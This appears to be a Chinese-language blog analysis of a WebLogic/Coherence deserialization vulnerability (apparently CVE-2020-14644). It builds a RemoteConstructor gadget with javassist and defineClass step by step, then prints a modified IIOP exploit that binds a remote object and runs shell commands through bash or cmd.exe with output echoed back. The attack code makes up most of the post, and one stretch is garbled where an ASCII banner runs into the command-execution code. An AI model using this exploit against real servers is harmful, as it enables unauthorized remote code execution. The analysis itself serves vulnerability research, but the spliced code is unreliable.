                }
            }
    }
        public void dumpClass(String sDir) {
            if (sDir != null) {
                File dirDump = new File(sDir, this.m_id.getPackage());
                boolean fDisabled = dirDump.isFile() || !dirDump.exists() && !dirDump.mkdirs();
                if (!fDisabled) {
                    try {
                        OutputStream os = new FileOutputStream(new File(dirDump, this.m_id.getSimpleName() + ".class"));
    Throwable var5 = null;
                        try {
                            os.write(this.m_abClass);
                        } catch (Throwable var15) {
                            var5 = var15;
                            throw var15;
                        } finally {
                            if (os != null) {
                                if (var5 != null) {
                                    try {
                                        os.close();
                                    } catch (Throwable var14) {
                                        var5.addSuppressed(var14);
                                    }
                                } else {
                                    os.close();
                                }
    }
                        }
                    } catch (IOException var17) {
                    }
                }
    }
    }
        public boolean equals(Object o) {
            if (!(o instanceof ClassDefinition)) {
                return false;
            } else {
                ClassDefinition that = (ClassDefinition)o;
                return this == that || this.getClass() == that.getClass() && Base.equals(this.m_id, that.m_id);
            }
    }
        public int hashCode() {
            return this.m_id.hashCode();
    }
        public String toString() {
            return "ClassDefinition{id=" + this.m_id + '}';
    }
        public void readExternal(DataInput in) throws IOException {
            this.m_id = (ClassIdentity)ExternalizableHelper.readObject(in);
            this.m_abClass = ExternalizableHelper.readByteArray(in);
    }
        public void writeExternal(DataOutput out) throws IOException {
            ExternalizableHelper.writeObject(out, this.m_id);
            ExternalizableHelper.writeByteArray(out, this.m_abClass);
    }
        public void readExternal(PofReader in) throws IOException {
            this.m_id = (ClassIdentity)in.readObject(0);
            this.m_abClass = in.readByteArray(1);
    }
        public void writeExternal(PofWriter out) throws IOException {
            out.writeObject(0, this.m_id);
            out.writeByteArray(1, this.m_abClass);
        }
    }
新框架代码如下：
    public class App2 {
    public static void main(String[] args) throws NotFoundException, IOException, CannotCompileException {
    ClassIdentity classIdentity = new ClassIdentity();
            ClassDefinition classDefinition = new ClassDefinition(
                    classIdentity,
    new byte[]{}
    );
            RemoteConstructor remoteConstructor = new RemoteConstructor(
                    classDefinition,
                    new Object[]{}
    );
    byte[] serialize= Serializables.serialize(remoteConstructor);
            try {
                Serializables.deserialize(serialize);
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
    }
        }
    }
还是null，说明要对classIdentity也进行赋值初始化，classIdentity的构造函数如下：
    public ClassIdentity(Class clazz) {
            this(clazz.getPackage().getName().replace('.', '/'), clazz.getName().substring(clazz.getName().lastIndexOf(46) + 1), Base.toHex(md5(clazz)));
    }
        protected ClassIdentity(String sPackage, String sBaseName, String sVersion) {
            this.m_sPackage = sPackage;
            this.m_sBaseName = sBaseName;
            this.m_sVersion = sVersion;
    }
可知ClassIdentity是一个new class。我们再同目录下创建一个test1的类。代码如下：
    package org.iiop;
    public class test1{
        static {
            System.out.println("success");
    }
    }
执行代码放在优先级最高的static里。
修改代码:
    ClassIdentity classIdentity = new ClassIdentity(org.iiop.test1.class);
            ClassDefinition classDefinition = new ClassDefinition(
                    classIdentity,
    new byte[]{}
    );
definition.getId()终于不是null了。
最终来到
definseClass可以通过``学习，我们可以看到sClassName已经是test1的值，但是abClass还是byte[0]，按理abClass里面存储的应该是test1的bytes值，所以我们需要想办法把abClass的值改成test1的bytes。一种是反射来修改，一种是看abClass是在哪里复制的。
这里我们采取第二种方法，因为`byte[] abClass =
definition.getBytes();`通过可知，abClass是通过definition来赋值的，但是definition我们前面在初始化的时候，只给了类名，没有给bytes，所以我们修改下代码。类的操作可以通过javassist库来进行操作。
代码修改如下：
    ClassIdentity classIdentity = new ClassIdentity(org.iiop.test1.class);
            ClassPool cp = ClassPool.getDefault();
            CtClass ctClass = cp.get(org.iiop.test1.class.getName());
            ctClass.replaceClassName(org.iiop.test1.class.getName(), org.iiop.test.class.getName() + "$" + classIdentity.getVersion());
    System.out.println(ctClass.toString());
            ClassDefinition classDefinition = new ClassDefinition(
                    classIdentity,
    ctClass.toBytecode()
    );
因为之前看到的sClassName是test1$+十六进制，所以要做个replaceClassName的替换操作。 不替换前：
替换后：
运行之后：
成功把test1的内容给执行了，但是还有个报错。`org.iiop.test1$0BC03FF199F8E95021E1281BDFAAA032
cannot be cast to
com.tangosol.internal.util.invoke.Remotable`没有实现Remotable接口，那就改写下test1。
    package org.iiop;
    import com.tangosol.internal.util.invoke.Remotable;
    import com.tangosol.internal.util.invoke.RemoteConstructor;
    public class test1 implements Remotable {
        static {
            System.out.println("success");
    }
        @Override
        public RemoteConstructor getRemoteConstructor() {
            return null;
    }
        @Override
    public void setRemoteConstructor(RemoteConstructor remoteConstructor) {
        }
    }
最终成功，无报错：
基本框架结束以后，在外面套一个T3协议或者iiop发送出去，即可rce。因为使用的是defineClass所以是可以直接回显的。
这边我直接给出UnicodeSec的利用iiop回显代码，其中有个小bug，我修改了一下一点点代码：
因为他的逻辑是if(iiopCtx.lookup(“UnicodeSec”) ==
null)我在测试过程中发现，因为第一次不存在UnicodeSec一定会是报错，导致一直不能进入rebind，一直循环在if这里，所以我采用try的方法，其他代码不变
    package org.iiop;
    import com.tangosol.internal.util.invoke.ClassDefinition;
    import com.tangosol.internal.util.invoke.ClassIdentity;
    import com.tangosol.internal.util.invoke.RemoteConstructor;
    import javassist.ClassPool;
    import javassist.CtClass;
    import weblogic.cluster.singleton.ClusterMasterRemote;
    import weblogic.jndi.Environment;
    import javax.naming.Context;
    import javax.naming.NamingException;
    import java.rmi.RemoteException;
    /**
     * created by UnicodeSec potatso
     */
    public class App {
        public static void main(String[] args) throws Exception {
            String text = "                   ___   ___ ___   ___        __ __ _  _     __ _  _   _  _                     \n" +
                    "                  |__ \\ / _ \\__ \\ / _ \\      /_ /_ | || |   / /| || | | || |                    \n" +
                    "   _____   _____     ) | | | | ) | | | |______| || | || |_ / /_| || |_| || |_    _____  ___ __  \n" +
                    "  / __\\ \\ / / _ \\   / /| | | |/ /| | | |______| || |__   _| '_ \\__   _|__   _|  / _ \\ \\/ / '_ \\ \n" +
                    " | (__ \\ V /  __/  / /_| |_| / /_| |_| |      | || |  | | | (_) | | |    | |   |  __/>   cmds = new ArrayList();
                if (isLinux) {
                    cmds.add("/bin/bash");
                    cmds.add("-c");
                    cmds.add(cmd);
                } else {
                    cmds.add("cmd.exe");
                    cmds.add("/c");
                    cmds.add(cmd);
    }
                ProcessBuilder processBuilder = new ProcessBuilder(cmds);
                processBuilder.redirectErrorStream(true);
    Process proc = processBuilder.start();
                BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
    StringBuffer sb = new StringBuffer();
                String line;
                while ((line = br.readLine()) != null) {
                    sb.append(line).append("\n");
    }
                return sb.toString();
            } catch (Exception e) {
                return e.getMessage();
            }
        }
    }
第一次发送会报错，因为在rebind，第二次就会回显：
## 0x04 总结
这是一次相对其他较简单的gadget分析，需要了解iiop，cobra，反序列化，序列化等相关知识，同时还需要了解javassist和defineClass的知识。
## 0x05 weblogic全球态势
## 0x06 参考
[Oracle cve 2020-14644
分析利用以及回显思路](https://www.cnblogs.com/potatsoSec/p/13451993.html)
[defineClass在java反序列化当中的利用](https://xz.aliyun.com/t/2272)